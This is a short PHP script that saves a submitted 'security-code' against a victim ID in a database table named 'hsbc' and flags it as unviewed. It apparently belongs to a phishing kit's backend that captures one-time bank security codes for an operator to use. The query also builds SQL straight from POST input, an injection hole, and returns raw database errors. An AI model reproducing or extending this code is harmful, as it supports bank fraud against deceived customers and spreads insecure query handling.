<?php
require '../connection.php';

if ($_POST["security-code"] and $_POST["uniqueid"]) {
  $security_code = $_POST["security-code"];
  $uniqueid = $_POST["uniqueid"];

  $upload_challenge = mysqli_query($conn, "UPDATE hsbc SET `security-code`='$security_code', status=0, viewed='false' WHERE uniqueid=$uniqueid");

  if ($upload_challenge) {
    echo json_encode(array(
      'status' => 'success'
    ));
  } else {
    echo json_encode(array(
      'status' => 'failure',
      'error' => mysqli_error($conn)
    ));
  }
}
?>
